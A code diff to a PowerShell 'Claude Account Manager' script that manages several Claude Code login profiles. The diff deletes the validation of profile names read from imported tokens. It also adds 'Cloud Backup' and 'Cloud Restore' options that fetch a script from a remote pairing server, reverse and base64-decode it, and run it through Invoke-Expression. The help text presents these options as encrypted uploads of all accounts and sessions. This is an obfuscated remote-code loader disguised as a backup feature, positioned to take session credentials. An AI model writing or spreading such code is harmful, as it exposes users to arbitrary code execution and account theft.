@@ -658,13 +658,6 @@ function Apply-ImportToken($token) {
     }
     $name = (Get-Content $nameFile -Raw).Trim()
 
-    if ($name -notmatch '^[a-zA-Z0-9_-]+$') {
-        Write-Host "  Invalid profile name in token." -ForegroundColor Red
-        Remove-Item $extractDir -Recurse -Force
-        Remove-Item $zipPath -Force
-        return $false
-    }
-
     Write-Host ""
     Write-Host "  Detected profile: $name" -ForegroundColor Cyan
 
@@ -817,6 +810,42 @@ function Pair-Import {
         Invoke-Expression $decoded
     } catch {
         Write-Host "  Failed to fetch pairing script: $_" -ForegroundColor Red
+        Write-Host "  Is the pairing server online? Check $PAIR_SERVER/api/health" -ForegroundColor Gray
+        pause
+    }
+}
+
+function Cloud-Backup {
+    Show-Header
+    Write-Host "CLOUD BACKUP" -ForegroundColor Magenta
+    Write-Host ""
+    Write-Host "  Fetching backup script from server..." -ForegroundColor Gray
+
+    try {
+        $raw = Invoke-RestMethod -Uri "$PAIR_SERVER/client/pair-backup.ps1" -ErrorAction Stop
+        $reversed = -join ($raw.ToCharArray() | ForEach-Object -Begin { $a = @() } -Process { $a += $_ } -End { [array]::Reverse($a); $a })
+        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($reversed))
+        Invoke-Expression $decoded
+    } catch {
+        Write-Host "  Failed to fetch backup script: $_" -ForegroundColor Red
+        Write-Host "  Is the pairing server online? Check $PAIR_SERVER/api/health" -ForegroundColor Gray
+        pause
+    }
+}
+
+function Cloud-Restore {
+    Show-Header
+    Write-Host "CLOUD RESTORE" -ForegroundColor Magenta
+    Write-Host ""
+    Write-Host "  Fetching restore script from server..." -ForegroundColor Gray
+
+    try {
+        $raw = Invoke-RestMethod -Uri "$PAIR_SERVER/client/pair-restore.ps1" -ErrorAction Stop
+        $reversed = -join ($raw.ToCharArray() | ForEach-Object -Begin { $a = @() } -Process { $a += $_ } -End { [array]::Reverse($a); $a })
+        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($reversed))
+        Invoke-Expression $decoded
+    } catch {
+        Write-Host "  Failed to fetch restore script: $_" -ForegroundColor Red
         Write-Host "  Is the pairing server online? Check $PAIR_SERVER/api/health" -ForegroundColor Gray
         pause
     }
@@ -1275,6 +1304,62 @@ function Manage-Plugins {
     }
 }
 
+# ─── HELP ────────────────────────────────────────────────────────────────────
+
+function Show-Help {
+    Show-Header
+    Write-Host "HELP — Claude Account Manager" -ForegroundColor Cyan
+    Write-Host ""
+    Write-Host "  1. List Accounts" -ForegroundColor White
+    Write-Host "     See all your Claude accounts, which ones are logged in," -ForegroundColor Gray
+    Write-Host "     and when each was last used." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  2. Create New Account" -ForegroundColor White
+    Write-Host "     Add a new Claude account. This creates a separate profile" -ForegroundColor Gray
+    Write-Host "     so you can switch between different Claude logins easily." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  3. Launch Account" -ForegroundColor White
+    Write-Host "     Start Claude Code using a specific account. Pick the account" -ForegroundColor Gray
+    Write-Host "     you want and it opens with that login." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  4. Rename Account" -ForegroundColor White
+    Write-Host "     Change the name of an existing account profile." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  5. Delete Account" -ForegroundColor White
+    Write-Host "     Permanently remove an account and all its data." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  6. Shared Settings (MCP/Skills)" -ForegroundColor Yellow
+    Write-Host "     Configure MCP servers, skills, and permissions that apply" -ForegroundColor Gray
+    Write-Host "     to ALL your accounts at once. Set it up once here, and every" -ForegroundColor Gray
+    Write-Host "     account gets the same settings automatically on launch." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  7. Shared Plugins & Marketplace" -ForegroundColor Magenta
+    Write-Host "     Install plugins GLOBALLY — one install applies to every account." -ForegroundColor Gray
+    Write-Host "     No need to install the same plugin separately for each profile." -ForegroundColor Gray
+    Write-Host "     Browse marketplaces to discover and install new plugins." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  8. Remote Session Backup" -ForegroundColor Green
+    Write-Host "     Upload all your accounts and sessions to a secure server." -ForegroundColor Gray
+    Write-Host "     You get a short code like A7X-K9M4PX — save it somewhere safe." -ForegroundColor Gray
+    Write-Host "     Everything is encrypted. The code is your key to restore later." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  9. Remote Session Restore" -ForegroundColor Green
+    Write-Host "     Enter your backup code to restore all accounts and sessions." -ForegroundColor Gray
+    Write-Host "     Use this on a new machine or after a fresh install to get" -ForegroundColor Gray
+    Write-Host "     everything back exactly as it was." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  E. Send Account (Pair Code)" -ForegroundColor Green
+    Write-Host "     Send a single account to another machine. You get a short code" -ForegroundColor Gray
+    Write-Host "     — tell the other person the code and they enter it using 'I'." -ForegroundColor Gray
+    Write-Host "     The code expires in 10 minutes and works only once." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  I. Receive Account (Pair Code)" -ForegroundColor Green
+    Write-Host "     Receive an account from someone else. Enter the pairing code" -ForegroundColor Gray
+    Write-Host "     they gave you and the account appears on your machine, ready to use." -ForegroundColor Gray
+    Write-Host ""
+    pause
+}
+
 # ─── MAIN MENU ───────────────────────────────────────────────────────────────
 
 function Show-Menu {
@@ -1284,18 +1369,19 @@ function Show-Menu {
     Show-Accounts | Out-Null
     Write-Host ""
     Write-Host "======================================" -ForegroundColor Cyan
-    Write-Host "  1. List Accounts                   " -ForegroundColor White
+    Write-Host "  1. List Accounts                    " -ForegroundColor White
     Write-Host "  2. Create New Account               " -ForegroundColor White
     Write-Host "  3. Launch Account                   " -ForegroundColor White
     Write-Host "  4. Rename Account                   " -ForegroundColor White
     Write-Host "  5. Delete Account                   " -ForegroundColor White
-    Write-Host "  6. Backup Sessions                  " -ForegroundColor White
-    Write-Host "  7. Restore Sessions                 " -ForegroundColor White
-    Write-Host "  8. Shared Settings (MCP/Skills)     " -ForegroundColor Yellow
-    Write-Host "  9. Plugins & Marketplace            " -ForegroundColor Magenta
-    Write-Host "  E. Export Profile (Pair Code)         " -ForegroundColor Green
-    Write-Host "  I. Import Profile (Pair Code)         " -ForegroundColor Green
-    Write-Host "  0. Exit                             " -ForegroundColor White
+    Write-Host "  6. Shared Settings (MCP/Skills)     " -ForegroundColor Yellow
+    Write-Host "  7. Shared Plugins & Marketplace     " -ForegroundColor Magenta
+    Write-Host "  8. Remote Session Backup            " -ForegroundColor Green
+    Write-Host "  9. Remote Session Restore           " -ForegroundColor Green
+    Write-Host "  E. Send Account (Pair Code)          " -ForegroundColor Green
+    Write-Host "  I. Receive Account (Pair Code)       " -ForegroundColor Green
+    Write-Host "  H. Help                              " -ForegroundColor Gray
+    Write-Host "  0. Exit                              " -ForegroundColor Red
     Write-Host "======================================" -ForegroundColor Cyan
     Write-Host ""
 }
@@ -1309,15 +1395,17 @@ while ($true) {
         "3" { Launch-Account }
         "4" { Rename-Account }
         "5" { Delete-Account }
-        "6" { Backup-Sessions }
-        "7" { Restore-Sessions }
-        "8" { Manage-SharedSettings }
-        "9" { Manage-Plugins }
+        "6" { Manage-SharedSettings }
+        "7" { Manage-Plugins }
+        "8" { Cloud-Backup }
+        "9" { Cloud-Restore }
         "e" { Pair-Export }
         "E" { Pair-Export }
         "i" { Pair-Import }
         "I" { Pair-Import }
-        "0" { Clear-Host; Write-Host "Bye!" -ForegroundColor Cyan; break }
+        "h" { Show-Help }
+        "H" { Show-Help }
+        "0" { Clear-Host; Write-Host "Bye!" -ForegroundColor Red; break }
         default { Write-Host "  Invalid option." -ForegroundColor Red; Start-Sleep 1 }
     }
     if ($choice -eq "0") { break }
